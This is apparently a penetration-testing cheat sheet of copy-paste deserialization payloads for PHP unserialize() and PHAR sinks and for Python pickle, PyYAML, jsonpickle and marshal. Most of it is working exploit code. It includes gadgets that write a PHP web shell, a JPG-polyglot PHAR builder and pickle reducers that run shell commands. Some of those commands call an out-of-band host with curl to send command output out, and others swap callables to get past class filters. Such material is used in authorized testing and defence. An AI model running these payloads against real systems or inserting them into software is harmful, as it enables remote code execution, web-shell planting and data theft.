# Runnable PHP + Python deserialization payloads — Open WHEN: you have confirmed a PHP unserialize()/PHAR sink or a Python pickle/PyYAML/jsonpickle sink and need a copy-paste payload generator

## PHP — magic-method lifecycle (which method fires when)
`unserialize()` instantiates every class in the stream (unless
`allowed_classes` is set). Callbacks during reconstruction, in order of use:
- `__wakeup()` — fires on deserialize. `__unserialize(array)` REPLACES it if defined.
- `__destruct()` — fires when the object is freed (end of request / GC).
- `__toString()` — fires when the object is concatenated/echoed (chain trigger).
- `__call`/`__get`/`__set` — fire on missing-method / property access mid-chain.

Hand-built object-injection string (target class with a side-effectful
`__destruct`/`__wakeup`). Property count and string lengths MUST be exact:
```php
// O:<namelen>:"<ClassName>":<propcount>:{ s:<len>:"<prop>"; <value>; }
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```

Generate a valid blob from a local copy of the gadget class:
```php
<?php
class Logger { public $logfile='/var/www/html/sh.php';
  public $data='<?php system($_GET[0]);?>';
  function __destruct(){ file_put_contents($this->logfile,$this->data); } }
echo base64_encode(serialize(new Logger()));   // drop into the cookie/field
```
Private/protected props need NUL bytes in the key — emit via `serialize()`,
never hand-type them:
```php
// private $x  -> s:6:"\0Cls\0x";   protected $y -> s:4:"\0*\0y";
```

## PHP — PHAR metadata deserialization (no visible unserialize() needed)
Any FS function on a `phar://` URL deserializes the archive's metadata object.
Build a JPG-polyglot PHAR whose metadata is your gadget:
```php
<?php   // run with:  php -d phar.readonly=0 make_phar.php
class Logger { public $logfile='/var/www/html/sh.php';
  public $data='<?php system($_GET[0]);?>';
  function __destruct(){ file_put_contents($this->logfile,$this->data); } }
@unlink('p.phar');
$p=new Phar('p.phar'); $p->startBuffering();
$p->addFromString('x.txt','x'); $p->setStub('GIF89a<?php __HALT_COMPILER();');
$p->setMetadata(new Logger());           // <-- gadget rides in metadata
$p->stopBuffering();
rename('p.phar','shell.jpg');            // upload as image
```
Trigger via any path-taking sink: `file_exists("phar://shell.jpg/x.txt")`,
`getimagesize("phar://…")`, `is_dir`, `md5_file`, `filesize`, `fopen`, etc.
With phpggc: `phpggc -p phar -pj real.jpg Monolog/RCE1 system id > shell.jpg`.

## Python — pickle `__reduce__` generators (copy-paste)
`__reduce__` returns `(callable, args_tuple)`; the callable runs on `loads()`.
```python
import pickle, base64
class R:
    def __reduce__(self):
        import os
        return (os.system, ("curl http://$RAND.oast.live/$(id|base64|tr +_ -)",))
print(base64.b64encode(pickle.dumps(R())).decode())
# protocol 2 for a py3->py2 target:  pickle.dumps(R(), 2)
```
Quiet OAST-first variant (no shell, just a DNS lookup):
```python
import pickle, base64, subprocess
class D:
    def __reduce__(self):
        return (subprocess.check_output, (["nslookup", "$RAND.oast.live"],))
open("p.pkl","wb").write(pickle.dumps(D()))
```
If a custom `Unpickler.find_class` blocks `os.system`, swap the callable:
```python
return (subprocess.Popen, (["id"],))
return (eval,   ("__import__('os').system('id')",))     # builtins.eval
return (exec,   ("import os;os.system('id')",))          # builtins.exec
return (__import__('os').system, ("id",))                # via __import__
return (getattr(__import__('os'),'popen'), ("id",))      # attribute hop
```
GET/POST opcode-level payload (no Python on the wire) — `c<module>\n<callable>`
then `(S'<cmd>'\ntR.`:
```
cposix
system
(S'id'
tR.
```

## Python — PyYAML / ruamel unsafe tags (yaml.load without SafeLoader)
```yaml
!!python/object/apply:os.system ["curl http://$RAND.oast.live"]
!!python/object/apply:subprocess.check_output [["nslookup","$RAND.oast.live"]]
!!python/object/new:subprocess.Popen [["id"]]
!!python/object/apply:os.popen [["id"]]
# eval gadget for filtered module names
!!python/object/apply:builtins.eval ["__import__('os').system('id')"]
```
Generate with the library so framing is exact:
```python
import yaml
class E:
    def __reduce__(self):
        import os; return (os.system, ("id",))
print(yaml.dump(E()))    # emits a !!python/object tag the loader will run
```

## Python — jsonpickle (revives arbitrary types from JSON)
`jsonpickle.decode()` instantiates the class named in `py/object` and can
invoke reducers via `py/reduce`:
```json
{"py/reduce":[{"py/function":"os.system"},{"py/tuple":["id"]}]}
```

## Python — sinks beyond pickle.loads that also execute on load
`dill.loads`, `cloudpickle.loads`, `joblib.load(f)`,
`numpy.load(f, allow_pickle=True)`, `pandas.read_pickle(f)`, `shelve.open` —
all unpickle, so the same `__reduce__` blob above works against any of them.
`marshal.loads` loads raw code objects (CPython-version specific):
```python
import marshal, base64
code = compile("import os;os.system('id')", "<x>", "exec")
print(base64.b64encode(marshal.dumps(code)).decode())   # send to marshal.loads
```
